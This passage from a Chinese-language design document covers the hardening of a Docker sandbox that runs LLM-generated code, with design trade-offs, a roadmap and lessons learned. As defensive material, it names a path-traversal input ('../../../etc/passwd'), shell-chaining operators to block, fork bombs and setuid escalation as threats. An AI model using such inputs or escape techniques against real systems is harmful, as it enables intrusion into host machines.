- 基础层用 alpine（5-50 MB），让 `ensureImage` 首次 pull 尽量快。

---

## 11. 设计权衡

| 抉择 | 动机 |
|---|---|
| 一次性容器（而非共享容器池） | 零状态泄漏；死循环不拖累下一次执行 |
| WarmPool 的 Release **也是销毁**，不复用 | 保住"阅后即焚"安全语义；只把 Create+Start 移到请求外 |
| 代码走 tar 流注入，**绝不**走 `sh -c "<code>"` | 避免 shell injection；审计时 code 内容可溯源 |
| `tar.go` 做 `filepath.Clean` + 去 IsAbs | 防 `../../../etc/passwd` 路径穿越 |
| 输出限 1 MiB | 防御性上限；正常用例可走 `ExecuteStream` 规避 |
| 默认 `NetworkMode=none` | 零信任：用户显式选白名单网络才开网 |
| `ExecuteWithVolume` 关 ReadonlyRootfs | go/rust build 需要写 ~/.cache；隔离来源（HITL 已审） |
| `ExecuteWithVolume` 黑名单 + 解符号链接 | 阻挡软链绕过 + 关键宿主目录挂载 |
| `Execute` 与 `ExecuteStream` 分两个方法 | 简单任务不搞 channel，调用方代码干净 |
| `chanWriter` 写 channel 时观察 ctx | 消费者关闭后 demux goroutine 不死锁 |
| `AutoRemove=false` 手动 defer Remove | 否则来不及抓 logs |
| `stdcopy.StdCopy` 解复用 | Docker attach/log 是 [8B header][payload] 多路流，直接 Read 拿到的是带 header 乱码 |
| `no-new-privileges` + `CapDrop=ALL` | 深度防御：即使生成提权脚本也无效 |
| 不做 Docker-in-Docker | 让沙箱不能 reach 宿主 docker daemon；socket 不暴露到容器内 |
| WarmPool **设计完成但不强制接线** | 默认空集群启动慢；用户显式开启才付预热代价 |

---

## 12. 后续演进

**P0 — 马上能做**

- [ ] **`toolRunTests` 命令前缀白名单**：当前 `req.Command` 直接拼入 `cd /workspace && <cmd>` 无校验（仅靠容器隔离兜底）；按语言约束前缀（`go test|pytest|npm test|cargo test`）+ 屏蔽 `;` `&&` `|` 拼接，把 LLM 误用空间收窄；
- [ ] **接线 WarmPool**：`main.go` 实例化 + `Manager.Execute` 加 Acquire 分支；冷启动 400ms → 50ms；
- [ ] **OOM 友好 stderr**：检测 `(Killed=true && ExitCode=137)`，用人话告诉 LLM"脚本超内存了，请优化"；
- [ ] **孤儿容器扫描**：启动时 `ContainerList(filter: label=code-agent.sandbox=true)` 强删；要先给容器加 label；
- [ ] **Image pre-pull**：启动时对 `cfg.Images` 所有项并行 pull，避免首次运行 30s 等待；
- [ ] **PidsLimit 按场景可配**：常规 256，`go build ./...` 允许临时放宽。

**P1 — 数周内**

- [ ] **后端抽象 `Backend interface`**：Docker 一个实现，K8s `Job` 另一个，统一接口便于在 K8s 部署时切换；
- [ ] **运行时资源采集**：`ContainerStats(one-shot)` → 解析 peak memory / cpu_usage → 接 `metrics/cost.go` 用于"按时间计费"；
- [ ] **Seccomp profile**：除 no-new-privileges，再加 syscall 白名单（更强隔离）；
- [ ] **审计接入**：每次 sandbox 执行写 `audit/logger.go`（user_id / task_id / cmd / exit_code / duration）；
- [ ] **`ExecuteWithVolume` 加 Volume quota**：`--storage-opt size=500M` 防写满；
- [ ] **大 stdout 流到对象存储**：S3/OSS URL 替代直塞 message history。

**P2 — 季度级**

- [ ] **gVisor / Kata runtime**：可选 sandbox-of-sandbox，内核级隔离更强；
- [ ] **K8s 原生后端**：用 `Job` 资源代替直连 Docker，便于 HPA 自动扩 worker；
- [ ] **沙箱内部装 Agent 代理**：代码发对象存储时加签 + 强制 egress 经代理；
- [ ] **Per-call 网络限制**：结合 egress validator 在每次 Execute 时动态算白名单。

---

## 13. 设计教训

**教训 1：单层防御一定会漏。** 早期版本只靠 `NetworkMode=none` + `Memory` + `NanoCPUs` 三件套，结果发现：fork bomb 不需要内存 → 漏；setuid 提权不需要网络 → 漏；写 `/bin/ls` 植后门不需要 CPU → 漏。每堵一个洞才意识到下一个洞。最终的 8 层硬化（Memory / NanoCPUs / PidsLimit / SecurityOpt / CapDrop / ReadonlyRootfs / Tmpfs / NetworkMode）每一层都因实际的攻击场景被加进来。**写沙箱时假设单层会被绕过，不是悲观——是经验。**

**教训 2：硬化配置必须有单一来源。** P0 #8 修复之前，`Execute` 和 `ExecuteStream` 各自写 HostConfig——结果一处加了 PidsLimit 另一处忘了。`buildHostConfig` helper 看起来只是 refactor，但实际是**防止漏配的结构性保险**。`ExecuteWithVolume` 加进来时只需 `buildHostConfig() + override Mounts + 关 ReadonlyRootfs`——所有其他防御项自动获得。

**教训 3：`stdcopy.StdCopy` 不可省。** P0 #9 修复前，`ExecuteStream` 直接 `Read(attachResp.Reader)` 把字节塞 channel——消费者拿到的是带 8 字节 header 的乱码（每隔一段就有 `\x01\x00\x00\x00...` 这种 binary 串）。这个 bug 在文本输出场景几乎隐形（dump 出来眼睛一扫就过去了），直到 LLM 收到这种"看似乱码的日志"开始幻觉判断"工具失败"。**Docker 的协议格式必须用 `stdcopy.StdCopy` 解复用，没有偷懒空间**。

**教训 4：WarmPool 不是缓存，是预创建队列。** 第一版 WarmPool 想"复用容器"——拿出来 exec、用完放回。立刻发现：上一次的 `/tmp` 残留 / 后台进程 / 环境变量都跨任务串扰，等于打破"阅后即焚"。**正确做法是 Release 即销毁，靠 replenishLoop 异步补位**——所有的"省时间"只来自把 Create+Start 移到请求 critical path 外，**不是复用**。这是一种逆直觉的优化：看起来是"池"，其实是"预备役"。

**教训 5：`chanWriter` 必须观察 ctx。** 第一版 chanWriter 实现是 `w.ch <- msg` 直写——结果消费者关闭后，demux goroutine 永远阻塞，容器虽然被 force remove 了但 goroutine 泄漏。加上 `select { case w.ch <- msg: case <-w.ctx.Done(): return ctx.Err() }` 后，ctx cancel 立刻让 demuxer 返回 → `defer attachResp.Close() / defer ContainerRemove()` 跑完 → goroutine 退出。**任何向有限 channel 写数据的代码都必须有 ctx 取消通路**，不然就是慢性 goroutine 泄漏。

---

下一篇：[`06_mcp.md`](06_mcp.md) —— Model Context Protocol 网关：JSON-RPC 2.0 客户端、stdio/SSE 双传输、子进程生命周期、自动重连。
